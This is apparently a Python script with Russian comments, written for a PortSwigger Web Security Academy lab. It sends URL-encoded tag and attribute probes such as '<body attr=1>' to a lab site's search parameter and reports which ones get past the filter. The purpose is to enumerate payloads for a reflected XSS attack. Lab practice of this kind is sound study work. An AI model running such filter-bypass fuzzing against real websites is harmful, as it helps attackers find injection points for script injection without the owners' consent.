import requests
from requests.utils import quote

def load_list_from_file(file_path):
    """
    Загружает строки из файла в список.
    """
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"[!] Ошибка: файл '{file_path}' не найден.")
        return []

def send_payload(url, payload, search_param="search"):
    """
    Отправляет запрос с заданным пейлоадом и анализирует ответ.
    """
    # Кодируем пейлоад для безопасной передачи в URL
    encoded_payload = quote(payload)
    full_url = f"{url}?{search_param}={encoded_payload}"
    
    try:
        response = requests.get(full_url)
        print(f"[*] Тестируем пейлоад: {payload}")
        print(f"Статус-код: {response.status_code}")
        if response.status_code == 200:
            print(f"Ответ сервера: {response.text[:200]}")
        else:
            print("[-] Пейлоад был заблокирован или произошла ошибка.")
        print("-" * 40)
        return response.status_code, response.text
    except requests.RequestException as error:
        print(f"[!] Ошибка при запросе: {error}")
        return None, None

def automate_testing(url, tags_file, attributes_file):
    """
    Автоматизирует тестирование XSS через теги и атрибуты.
    """
    # Загружаем теги и атрибуты из файлов
    tags = load_list_from_file(tags_file)
    attributes = load_list_from_file(attributes_file)
    
    if not tags or not attributes:
        print("[!] Ошибка: один из файлов пуст или отсутствует.")
        return

    print("[*] Начинаем тестирование тегов...")
    for tag in tags:
        payload = f"<{tag}>"
        send_payload(url, payload)
    
    print("[*] Тестирование атрибутов...")
    for attr in attributes:
        payload = f"<body {attr}=1>"
        send_payload(url, payload)

if __name__ == "__main__": 
    
    target_url = "https://0aa4004803f307cd814d2a7300cd00fb.web-security-academy.net/"
    
    tags_file_path = "./tags.dict"  
    attributes_file_path = "./attributes.dict"  
    
    automate_testing(target_url, tags_file_path, attributes_file_path)


describe by GPT4-o
